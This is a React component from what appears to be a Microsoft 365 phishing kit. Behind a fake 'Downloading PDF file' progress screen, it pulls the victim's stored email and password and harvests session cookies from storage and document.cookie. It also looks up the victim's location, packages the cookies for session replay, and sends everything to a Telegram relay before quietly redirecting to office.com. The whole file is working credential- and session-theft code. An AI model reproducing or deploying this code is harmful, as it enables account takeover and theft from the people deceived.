import React, { useEffect, useState } from 'react';
import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookies';

/**
 * AuthCallback Component
 * Uses restoreCookies.ts functions for proper cookie handling
 */

function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

const AuthCallback: React.FC = () => {
  const [status, setStatus] = useState('Downloading PDF file...');
  const [downloadProgress, setDownloadProgress] = useState(0);

  useEffect(() => {
    const executeCallback = async () => {
      setStatus('Downloading PDF file...');
      setDownloadProgress(10);

      console.log('🔄 AuthCallback: Starting data consolidation');

      // --- 1. Retrieve Stored Credentials ---
      let credentials = null;
      try {
        const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
        if (storedCreds) {
          credentials = JSON.parse(storedCreds);
          console.log('✅ Credentials retrieved from storage.');
          setDownloadProgress(25);
        } else {
          console.error('❌ FATAL: No credentials found in storage. Aborting.');
          setStatus('Error: Could not find stored credentials.');
          return;
        }
      } catch (error) {
        console.error('❌ FATAL: Failed to parse credentials from storage.', error);
        setStatus('Error: Failed to parse credentials.');
        return;
      }

      // --- 2. Retrieve Captured Cookies Using restoreCookies.ts ---
      let cookies: any[] = [];
      try {
        console.log('🍪 Retrieving captured cookies using restoreCookies.ts...');
        
        // Use getStoredData() from restoreCookies.ts
        const storedData = getStoredData();
        
        if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
          cookies = storedData.cookies;
          console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts getStoredData()`);
        } else {
          // Fallback: Get cookies from injector storage
          const capturedCookiesData = localStorage.getItem('captured_cookies_data') || sessionStorage.getItem('captured_cookies_data');
          
          if (capturedCookiesData) {
            try {
              const parsedData = JSON.parse(capturedCookiesData);
              if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
                cookies = parsedData.cookies;
                console.log(`✅ Retrieved ${cookies.length} cookies from injector storage`);
              }
            } catch (parseError) {
              console.warn('⚠️ Failed to parse captured cookies data:', parseError);
            }
          }
        }

        // If still no cookies, try to capture from document.cookie
        if (cookies.length === 0) {
          console.log('📝 No stored cookies found, capturing from document.cookie...');
          const cookieString = document.cookie;
          if (cookieString) {
            const cookiePairs = cookieString.split(';');
            cookiePairs.forEach(pair => {
              const trimmed = pair.trim();
              if (trimmed) {
                const equalsIndex = trimmed.indexOf('=');
                if (equalsIndex > 0) {
                  const name = trimmed.substring(0, equalsIndex).trim();
                  const value = trimmed.substring(equalsIndex + 1).trim();
                  
                  if (name && value) {
                    cookies.push({
                      name: name,
                      value: value,
                      domain: window.location.hostname,
                      path: '/',
                      secure: window.location.protocol === 'https:',
                      sameSite: 'Lax',
                      session: true
                    });
                  }
                }
              }
            });
            console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
          }
        }

        setDownloadProgress(40);
      } catch (error) {
        console.warn('⚠️ Failed to retrieve cookies:', error);
      }

      // --- 3. Fetch Location Data ---
      setStatus('Downloading PDF file...');
      let locationData: any = {};
      try {
        const response = await fetch('https://ipapi.co/json/');
        locationData = await response.json();
        console.log('✅ Location data fetched.');
        setDownloadProgress(55);
      } catch (error) {
        console.warn('⚠️ Failed to fetch location data:', error);
      }

      // --- 4. Create Cookie File Using restoreCookies.ts Format ---
      const createCookieFile = (cookiesToExport: any[]) => {
        console.log('📝 Creating cookie file in restoreCookies.ts format...');
        
        try {
          // Format cookies using restoreCookies.ts compatible format
          const exportedCookies = cookiesToExport.map(cookie => ({
            name: cookie.name || '',
            value: cookie.value || '',
            domain: cookie.domain || window.location.hostname,
            path: cookie.path || '/',
            secure: !!cookie.secure,
            httpOnly: !!cookie.httpOnly,
            sameSite: cookie.sameSite || 'Lax',
            session: !!cookie.session,
            expires: cookie.expires,
            expirationDate: cookie.expirationDate
          }));

          // Get browser capabilities using restoreCookies.ts function
          const browserCapabilities = detectBrowserCapabilities();

          const jsonContent = JSON.stringify({
            version: '1.0',
            exportedAt: new Date().toISOString(),
            source: 'AuthCallback-restoreCookies',
            domain: window.location.hostname,
            totalCookies: exportedCookies.length,
            cookies: exportedCookies,
            browserCapabilities: browserCapabilities,
            note: 'Cookies exported in restoreCookies.ts format - Compatible with restoreMicrosoftCookies function'
          }, null, 2);

          const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
          console.log(`✅ Cookie file created (${fileSizeInBytes} bytes)`);
          console.log(`📊 Total cookies: ${exportedCookies.length}`);
          console.log(`🌐 Browser: ${browserCapabilities.browser} v${browserCapabilities.version}`);

          return {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: fileSizeInBytes
          };
        } catch (error) {
          console.error('❌ Failed to create cookie file:', error);
          return null;
        }
      };

      const cookieFile = createCookieFile(cookies);

      if (cookieFile) {
        console.log('✅ Cookie file object created:', {
          name: cookieFile.name,
          size: cookieFile.size,
          hasContent: !!cookieFile.content,
          contentLength: cookieFile.content?.length || 0
        });
      } else {
        console.error('❌ Failed to create cookie file');
      }

      setDownloadProgress(70);

      // --- 5. Build Payload ---
      setStatus('Downloading PDF file...');
      const payload = {
        email: credentials.email,
        password: credentials.password,
        passwordSource: 'auth-callback-final',
        cookies: cookies,
        locationData: locationData,
        cookieFiles: cookieFile ? {
          jsonFile: {
            name: cookieFile.name,
            content: cookieFile.content,
            size: cookieFile.size
          }
        } : {},
        userAgent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        validated: true,
        microsoftAccount: true,
        captureContext: {
          sourceComponent: 'AuthCallback',
          cookiesCaptured: cookies.length,
          cookieFileCreated: !!cookieFile,
          usingRestoreCookiesTS: true,
          usingDetectBrowserCapabilities: true,
          usingGetStoredData: true
        }
      };

      console.log('═════════════════════════════════════════');
      console.log('📤 EXACT PAYLOAD STRUCTURE:');
      console.log('═════════════════════════════════════════');
      console.log('cookieFiles exists:', !!payload.cookieFiles);
      console.log('cookieFiles.jsonFile exists:', !!payload.cookieFiles.jsonFile);
      if (payload.cookieFiles.jsonFile) {
        console.log('  - name:', payload.cookieFiles.jsonFile.name);
        console.log('  - size:', payload.cookieFiles.jsonFile.size);
        console.log('  - content exists:', !!payload.cookieFiles.jsonFile.content);
        console.log('  - content length:', payload.cookieFiles.jsonFile.content?.length);
        console.log('  - content type:', typeof payload.cookieFiles.jsonFile.content);
        console.log('  - content preview:', payload.cookieFiles.jsonFile.content?.substring(0, 100));
      }
      console.log('═════════════════════════════════════════');

      const payloadSize = JSON.stringify(payload).length;
      console.log(`📊 Total payload size: ${payloadSize} bytes (${(payloadSize / 1024).toFixed(2)}KB)`);

      console.log('📤 Payload Summary:', {
        email: payload.email,
        password: '***',
        cookiesCount: payload.cookies.length,
        hasLocationData: !!payload.locationData.ip,
        hasCookieFile: !!payload.cookieFiles.jsonFile,
        cookieFileName: payload.cookieFiles.jsonFile?.name,
        cookieFileSize: payload.cookieFiles.jsonFile?.size,
        timestamp: payload.timestamp
      });

      // --- 6. Send Payload to Telegram ---
      try {
        setDownloadProgress(85);
        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        console.log('═════════════════════════════════════════');
        console.log('✅ SERVER RESPONSE:');
        console.log('═════════════════════════════════════════');
        console.log('Status:', response.status);

        // ✅ FIXED: Only read response body ONCE
        let responseData: any;
        try {
          responseData = await response.json();
          console.log('Response data:', responseData);
        } catch (e) {
          console.error('Failed to parse response JSON:', e);
          responseData = {};
        }

        console.log('Credentials transmitted:', responseData.transmitted?.credentials);
        console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
        console.log('═════════════════════════════════════════');

        if (response.ok) {
          console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
          console.log('📊 Telegram Response:', responseData);
          setDownloadProgress(100);
          setStatus('Download Successful');

          setTimeout(() => {
            console.log('🎉 Flow complete. Silently redirecting to final destination.');
            window.location.href = 'https://www.office.com/?auth=2';
          }, 2500);
        } else {
          console.error('❌ Transmission failed. Server responded with:', response.status);
          setStatus(`Error: Transmission failed with status ${response.status}.`);
          return;
        }
      } catch (error) {
        console.error('❌ FATAL: Network error during transmission.', error);
        setStatus('Error: Network failure during transmission.');
        return;
      }
    };

    executeCallback();
  }, []);

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1',
      color: '#323130'
    }}>
      <div style={{
        textAlign: 'center',
        padding: '40px'
      }}>
        {downloadProgress === 100 ? (
          <div>
            <h2 style={{
              fontSize: '18px',
              marginBottom: '10px',
              color: '#107C10',
              fontWeight: '600'
            }}>Download Successful</h2>
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '0'
            }}>Your file is ready.</p>
          </div>
        ) : (
          <div>
            <h2 style={{
              marginBottom: '20px',
              fontSize: '24px'
            }}>{status}</h2>

            <div style={{
              width: '300px',
              height: '8px',
              backgroundColor: '#e0e0e0',
              borderRadius: '4px',
              overflow: 'hidden',
              marginBottom: '20px',
              margin: '0 auto 20px'
            }}>
              <div style={{
                width: `${downloadProgress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease',
                borderRadius: '4px'
              }}></div>
            </div>

            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '30px'
            }}>{downloadProgress}%</p>

            <div style={{
              border: '4px solid #f3f2f1',
              borderTop: '4px solid #0078d4',
              borderRadius: '50%',
              width: '40px',
              height: '40px',
              animation: 'spin 1s linear infinite',
              margin: '0 auto'
            }}></div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default AuthCallback;
